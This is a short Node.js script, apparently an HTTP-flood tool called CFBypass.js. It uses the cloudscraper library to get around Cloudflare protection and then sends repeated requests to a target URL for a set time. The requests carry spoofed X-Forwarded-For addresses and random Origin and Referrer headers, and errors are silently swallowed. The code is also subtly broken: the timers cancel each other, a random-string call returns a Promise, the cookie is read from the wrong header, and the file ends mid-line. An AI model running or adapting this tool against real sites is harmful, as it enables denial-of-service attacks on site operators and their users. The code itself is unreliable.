
const cloudscraper = require('cloudscraper');
const request = require('request');

const url = process.argv[2];
const time = process.argv[3];

if (process.argv.length <= 2) {
    console.log('Usage: node CFBypass.js <url> <time>');
    process.exit(-1);
}

const randomByte = () => Math.round(Math.random() * 255);

const randomStringGenerate = async (length) => {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};

const int = setInterval(() => {
    cloudscraper.get(url, (err, res, body) => {
        if (err) {
            console.log('failed to get website data');
        } else {
            const cookie = res.headers['cookie'];
            const userAgent = res.headers['User-Agent'];

            const randomString = randomStringGenerate(10);
            const fakeIP = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

            const options = {
                url: url,
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': 1,
                    'cookie': cookie,
                    'Origin': `http://${randomString}.com`,
                    'Referrer': `http://google.com/${randomString}`,
                    'X-Forwarded-For': fakeIP
                }
            };

            request(options);
        }
    });
}, time * 1000);

setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

console

